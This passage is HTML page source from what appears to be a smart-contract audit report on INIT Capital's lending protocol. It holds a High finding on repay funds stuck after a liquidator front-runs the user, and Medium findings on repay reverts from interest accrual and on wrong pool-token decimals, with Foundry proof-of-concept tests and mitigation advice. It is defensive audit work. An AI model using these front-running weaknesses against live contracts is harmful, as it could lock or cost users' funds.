</span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">debtShareToAmtCurrent</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sharesToRepay</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// take token from msg.sender to pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenToRepay</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">underlyingToken</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt;     </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenToRepay</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amtToRepay</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update debt on the position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IPosManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">POS_MANAGER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updatePosDebtShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, -</span><span class=\"mtk12\">sharesToRepay</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt256</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// call repay on the pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sharesToRepay</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update debt on mode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IRiskManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">riskManager</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateModeDebtShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_mode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, -</span><span class=\"mtk12\">sharesToRepay</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt256</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Consider a scenario where the user’s positions are currently liquidatable, and the user wishes to repay all of the position’s debt inside the <code>MoneyMarketHook</code>. However, a liquidator front-runs the operation by liquidating the user’s position. Now, when the repayment operation executes from <code>MoneyMarketHook</code>, it transfers the <code>repayAmt</code> to the <code>MoneyMarketHook</code> but the amount is not used/fully utilized and becomes stuck inside the contract.</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider to also check the provided shares against the actual debt shares inside the <code>InitCore</code>/<code>PosManager</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/28#issuecomment-1870322481\">fez-init (INIT) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>The issue should be medium, since the funds cannot be retrieved by someone else. The hook will be upgradeable, so if funds actually get stuck, it is still retrievable.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/28#issuecomment-1871745239\">hansfriese (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>I agree that this issue is in the middle of Medium and High.\nUsers might face a temporary lock on their funds, and the hook should be upgraded every time to unlock them.</p>\n<p>Given the high probability of this scenario occurring, I will keep this issue as a valid High.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-12\" style=\"position:relative;\"><a href=\"#medium-risk-findings-12\" aria-label=\"medium risk findings 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (12)</h1>\n<h2 id=\"m-01-repay-liquidate-and-liquidatewlp-receive-shares-as-argument-which-may-revert-if-from-approval-to-tx-settled-blocks-have-passed\" style=\"position:relative;\"><a href=\"#m-01-repay-liquidate-and-liquidatewlp-receive-shares-as-argument-which-may-revert-if-from-approval-to-tx-settled-blocks-have-passed\" aria-label=\"m 01 repay liquidate and liquidatewlp receive shares as argument which may revert if from approval to tx settled blocks have passed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/38\">[M-01] repay(), liquidate() and liquidateWLp() receive shares as argument, which may revert if from approval to tx settled blocks have passed</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/38\">0x73696d616f</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L151\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L151</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L282\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L282</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L317\">https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L317</a></p>\n<p><code>repay()</code>, <code>liquidate()</code> and <code>liquidateWLp()</code> transactions revert if users approve the exact repay amount they need in the frontend and only after some blocks have passed is the transaction settled. This happens because the interest accrual is by timestamp, so the debt would have increased since the approval, when the transaction settles.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>A test when repaying debt was carried out in <code>TestInitCore.sol</code>. The timestamp increased just 1 second, but it was enough to make the transaction revert. It may be possible to request a bigger alowance than expected, but this has other implications.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_POC_TransferFromFails_DueToDebtAccrual</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_wbtcAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">3e8</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_borrowAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_user</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;user&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_wbtcAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createPos</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_user</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_mintPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">]), </span><span class=\"mtk12\">_wbtcAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">lendingPools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">].</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">positionManager</span><span class=\"mtk1\">), </span><span class=\"mtk12\">shares_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">initCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">collateralize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">]));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_debtShares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_borrow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">]), </span><span class=\"mtk12\">_borrowAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_userDebtBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lendingPools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">].</span><span class=\"mtk11\">debtShareToAmtCurrent</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_debtShares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">initCore</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_userDebtBalance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ERC20: transfer amount exceeds balance&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">initCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">repay</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">]), </span><span class=\"mtk12\">_debtShares</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Vscode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Receive the amount in InitCore as argument instead of the shares on the <code>repay()</code>, <code>liquidate()</code> and <code>liquidateWLp()</code> functions.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/38#issuecomment-1871620933\">fez-init (INIT) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>The issue should be mitigated with the introduction of hooks, where such additional logic of amount to share conversion can be implemented. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-decimals-of-lendingpool-dont-take-into-account-the-offset-introduced-by-virtual_shares\" style=\"position:relative;\"><a href=\"#m-02-decimals-of-lendingpool-dont-take-into-account-the-offset-introduced-by-virtual_shares\" aria-label=\"m 02 decimals of lendingpool dont take into account the offset introduced by virtual_shares permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/36\">[M-02] Decimals of LendingPool don’t take into account the offset introduced by VIRTUAL_SHARES</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/36\">0x73696d616f</a></em></p>\n<p>The impact of this finding is more on the marketing/data fetching side, on exchanges it would appear that the shares are worth less <code>VIRTUAL_SHARES</code> than the underlying token. Given that it would influence the perception of the value of the shares token, medium severity seems appropriate.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The Openzeppelin <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC4626.sol#L106-L108\">implementation</a> includes the decimals offset (log10(<code>VIRTUAL_SHARES</code>) in LendingPool) in the <code>decimals()</code> function. However, INIT only places the decimals of the <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/lending_pool/LendingPool.sol#L95-L97\">underlying</a>.</p>\n<p>A POC was built, add it to <code>TestLendingPool.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_POC_WrongDecimals</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_wbtcAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">3e8</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// 3 BTC</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_user</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;user&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_mintPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">, </span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_wbtcAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_wbtcDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">VIRTUAL_SHARES</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_poolDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk12\">lendingPools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">].</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_userBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lendingPools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">WBTC</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_userBalance</span><span class=\"mtk1\">/</span><span class=\"mtk12\">_poolDecimals</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_wbtcAmount</span><span class=\"mtk1\">/</span><span class=\"mtk12\">_wbtcDecimals</span><span class=\"mtk1\">*</span><span class=\"mtk12\">VIRTUAL_SHARES</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_userBalance</span><span class=\"mtk1\">/</span><span class=\"mtk12\">_poolDecimals</span><span class=\"mtk1\">, </span><span class=\"mtk7\">3e8</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_userBalance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_wbtcAmount</span><span class=\"mtk1\">*</span><span class=\"mtk12\">VIRTUAL_SHARES</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 